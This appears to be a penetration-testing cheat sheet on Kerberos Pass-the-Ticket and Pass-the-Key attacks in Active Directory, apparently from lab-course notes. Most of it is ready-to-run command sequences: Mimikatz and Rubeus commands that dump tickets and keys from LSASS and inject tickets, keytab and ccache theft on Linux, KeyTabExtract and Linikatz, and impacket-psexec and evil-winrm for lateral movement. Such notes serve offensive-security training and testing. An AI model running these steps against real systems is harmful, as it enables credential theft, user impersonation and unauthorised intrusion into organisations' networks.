Another method for moving laterally in an Active Directory environment is called a [Pass the Ticket (PtT) attack](https://attack.mitre.org/techniques/T1550/003/). In this attack, we use a stolen Kerberos ticket to move laterally instead of an NTLM password hash.
## Kerberos Summary
Kerberos is an authentication protocol that uses a `Key Distribution Center (KDC)` to manage user and service authentication. The`KDC` is composed of two parts -- the `Authentication Server (AS)` and the `Ticket-Granting Service (TGS)`

The `AS` issues the `Ticket Granting Ticket` (`TGT`) upon initial user authentication. The `TGT` permits the client to obtain additional Kerberos tickets or Service Tickets from the `TGS`.

The `Ticket Granting Service` (`TGS`) issues Service Tickets to users who want to use a service. The user presents their `TGT` and then the `TGS` validates it, then issues the Service Tickets. These tickets allow services to verify the user's identity.

## Windows
#### Harvesting Kerberos tickets
Tickets and processed are stored by LSASS.

Export tickets
```PowerShell
# Mimikatz
.\mimikatz.exe
privilege::debug
sekurlsa::tickets /export

# Rubeus
.\Rubeus.exe dump /nowrap
```
Result is a list of files with `.kirbi` extension

#### Pass the Key / OverPass the Hash
This approach converts a domain-user hash/key into a TGT

```PowerShell
# Extract Kerberos keys
.\mimikatz.exe
privilege::debug
sekurlsa::ekeys  # dumps users Kerberos encryption keys (AES256,RC4(NTLM),SHA1,etc)

# Mimikatz Pass the Key -- will spawn a new cmd.exe window
.\mimikatz.exe
privilege::debug
sekurlsa::pth /domain:<domain> /user:<user> /ntlm:<NTLM_key> # /aes256:AES_key...
 
# Rubeus Pass the Key
.\Rubeus.exe asktgt /domain:<domain> /user:<user> /aes256:<AES_key> /nowrap # /rc4, /aes128, /aes256, /des

```

#### Pass the Ticket (PtT)
Now that we have some Kerberos tickets, we can use them to move laterally within an environment.

Usage
```PowerShell
# Rubeus PtT
# Rubeus -- asktgt
.\Rubeus.exe asktgt /domain:<domain> /user:<user> /rc4:<hash> /ptt

# Rubeus -- import ticket from .kirbi file
.\Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-user@krbtgt-inlanefreight.htb.kirbi

# Rubeus -- Base64 format
[Convert]::ToBase64String([IO.File]::ReadAllBytes("<ticket>.kirbi"))
.\Rubeus.exe ptt /ticket:<.kirbi base64 string>
_____________________________________________________________________________

# Mimikatz PtT
.\mimikatz.exe
privilege::debug
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
______________________________________________________________________________

# PowerShell Remoting AFTER PtT
powershell
Enter-PSSession -ComputerName DC01
```

## Linux
Windows and Linux use the same process to request a Ticket Granting Ticket (TGT) and Service Ticket (TGS) but ticket information is stored differently. 

Linux machines store Kerberos tickets as ccache files. 
Ticket is stored in env variable `KRB5CCNAME`.
Another everyday use of Kerberos in Linux is `keytab` files.

#### Identifying Linux and AD integration
```bash
realm list # look to see if machine is configured as Kerberos member

# if realm not available --
ps -ef | grep -i "winbind\|sssd"
```

#### Finding Kerberos tickets in Linux
```bash
# KeyTab files
find / -name *keytab* -ls 2>/dev/null  # find method
crontab -l                             # cronjob method

# ccache files
env | grep -i krb5  # in env variables
ls -la /tmp         # in /tmp
```

#### Abusing KeyTab files

Impersonate a User
```bash
# List KeyTab file information
klist -k -t <file.keytab>

# impersonate a user with a KeyTab
klist                                        # confirm current ticket
kinit <user>@<domain> -k -t <file.keytab>    # import KeyTab ticket
klist                                        # verify new ticket is loaded

# run commands utilizing kerberos ticket to impersonate user
smbclient //dc01/user -k -c ls  # example os using smbclient with -k
netexec -k
impacket-psexec -k
etc...
```

Extract Secrets using [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
```bash
git clone https://github.com/sosdave/KeyTabExtract.git
python3 keytabextract.py <file.keytab>
# from here, crack NTLM hash or forge tickets using AES256/AES128 hash
```

#### Abusing KeyTab ccache
```bash
# identify ccache files
env 
ls -la /tmp

# identify group membership
id <domain user>   # looking for privileged users

# import ccache file into current session
klist
cp /tmp/<ccache_file> .
export KRB5CCNAME=<ccache_file>
klist    # verify ccache is loaded in env
# use commands as required
```

Using Linux attack tools with Kerberos
```bash
# modify /etc/hosts file
# set up pivot/tunnel tools as needed
# import ccache into attack box env
proxychains impacket-psexec dc01 -k # example
```

Evil-WinRM with Kerberos
```bash
# install Kerberos package
sudo apt-get install krb5-user -y

# modify Kerberos config file
cat /etc/krb5.conf

[libdefaults]
        default_realm = <DOMAIN>

...SNIP...

[realms]
    <DOMAIN> = {
        kdc = <DC_HOSTNAME>.<DOMAIN>
    }

...SNIP...

# Using Evil-WinRM with Kerberos
evil-winrm -i <ip/hostname> -r <domain (realm)>
```

#### Linikatz
[Linikatz](https://github.com/CiscoCXSecurity/linikatz) is used to exploit creds on Linux boxes that are integrated with AD. Similar to Mimikatz

Usage
```bash
./linikatz.sh
```

## Miscellaneous

#### Convert `ccache` to `kirbi` and vice versa
```bash
# ccache -> kirbi
impacket-ticketConverter -i <ccache.file> -o <file.kirbi>
.\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi # import ticket into windows session

# kirbi -> ccache
impacket-ticketConverter -i <file.kirbi> -o <ccache.file> 
export KRB5CCNAME=<ccache_file>
```

